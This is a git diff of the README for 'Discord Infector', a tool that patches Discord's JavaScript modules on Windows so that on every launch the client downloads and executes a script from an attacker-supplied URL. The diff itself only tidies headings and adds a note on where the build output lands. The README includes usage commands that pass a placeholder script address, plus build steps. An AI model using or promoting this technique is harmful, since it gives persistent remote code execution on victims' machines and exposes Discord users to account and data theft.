@@ -1,14 +1,14 @@
-#Discord Infector 
+# Discord Infector
 
 This tool allows you to modify some of Discord's data files on Windows to run arbitrary code every time Discord is launched.
 
-##Usage 
+## Usage
 
 You can download the release binary from releases and use it with `.\DiscordInfector.exe https://example.org/examplescript.js`
 This will attempt to patch one of your Discord AppData Javascript modules to execute a file that will attempt to grab the script at the specified address and execute it.
 
 
-##Building 
+## Building
 
 To build the tool yourself, you will need the following installed:
 - NodeJS 10+
@@ -23,4 +23,5 @@ The steps to build the tool are as followed.
 3. `npm install`
 4. `npm run build`
 
+The resulting build will be at `DiscordInfector.exe`.
 If you would like to run it without building it you can run `node index.js https://example.org/examplescript.js`.
